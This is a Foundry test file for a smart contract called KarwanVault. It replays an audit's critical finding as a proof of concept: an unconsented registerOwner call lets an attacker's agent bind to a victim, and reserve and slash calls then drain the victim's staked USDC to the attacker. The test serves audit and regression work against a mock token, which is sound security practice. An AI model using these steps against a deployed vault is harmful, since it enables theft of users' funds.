// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {KarwanVault} from "../src/KarwanVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Minimal ERC-20 mock (mirrors KarwanVault.t.sol's MockUSDC).
contract MockUSDC is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "INSUFFICIENT");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(allowance[from][msg.sender] >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "INSUFFICIENT");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @title C-1: registerOwner stake-theft attack replay
/// @notice The audit's single CRITICAL. `KarwanVault.registerOwner` lets any
///         agent bind itself to ANY owner with no consent from that owner.
///         Because reserve/slash resolve the agent to that owner, an attacker
///         binds a throwaway agent to a victim, funds an escrow with the agent
///         as seller, then disputes+refunds to slash the victim's staked USDC
///         to themselves.
///
///         This test is written against v1 (pre-fix) and PROVES the theft: it
///         is expected to PASS on the current contract. Vault v2's consented
///         binding makes step 1 (registerOwner without approval) revert, at
///         which point `test_C1_TheftReplay_stealsVictimStake` can no longer
///         reach the theft — flip it to expect the revert and add
///         `test_C1_RegisterOwner_RevertsWithoutApproval` (plan §8).
contract KarwanVaultC1AttackTest is Test {
    KarwanVault vault;
    MockUSDC usdc;

    address victim = makeAddr("victim"); // an honest staker with free stake
    address escrow = makeAddr("escrow"); // the escrow the vault trusts
    address attacker = makeAddr("attacker"); // the beneficiary of the slash
    address attackerAgent = makeAddr("attackerAgent"); // throwaway agent wallet

    uint256 constant ONE_USDC = 1e6;

    function setUp() public {
        usdc = new MockUSDC();
        vault = new KarwanVault(address(usdc));
        vault.setEscrow(escrow);
        // The victim stakes real USDC. This is the money the attacker steals.
        usdc.mint(victim, 1_000 * ONE_USDC);
        vm.startPrank(victim);
        usdc.approve(address(vault), 100 * ONE_USDC);
        vault.deposit(100 * ONE_USDC);
        vm.stopPrank();
    }

    /// PROOF the vulnerability is live on v1. Expected to PASS today.
    function test_C1_TheftReplay_stealsVictimStake() public {
        bytes32 jobId = keccak256("attack-job");
        uint256 stealAmount = 100 * ONE_USDC;

        // Sanity: the victim's stake and the attacker's empty wallet before.
        assertEq(vault.freeStakeOf(victim), stealAmount, "victim starts with free stake");
        assertEq(usdc.balanceOf(attacker), 0, "attacker starts empty");

        // STEP 1 -- the consent bug. The attacker's agent binds itself to the
        // victim. The victim never approved this and cannot reject it.
        vm.prank(attackerAgent);
        vault.registerOwner(victim);
        assertEq(vault.agentOwner(attackerAgent), victim, "agent bound to victim without consent");

        // STEP 2 -- escrow reserves the "seller" (the attacker's agent) which
        // resolves to the victim, booking the reservation against the victim's
        // stake. In production the attacker triggers this by funding an escrow
        // with attackerAgent as seller and reservationBps = 10000.
        vm.prank(escrow);
        vault.reserve(jobId, attackerAgent, stealAmount);
        assertEq(vault.reservedTotal(victim), stealAmount, "victim's stake reserved");

        // STEP 3 -- the dispute/refund path slashes the reservation to the
        // attacker. Escrow.refund calls vault.slash(jobId, buyer); here the
        // attacker is the funding buyer, so the beneficiary is the attacker.
        vm.prank(escrow);
        vault.slash(jobId, attacker);

        // THEFT CONFIRMED: the victim's staked USDC is now the attacker's.
        assertEq(usdc.balanceOf(attacker), stealAmount, "attacker received the victim's stake");
        assertEq(vault.freeStakeOf(victim), 0, "victim's stake was drained");
    }
}
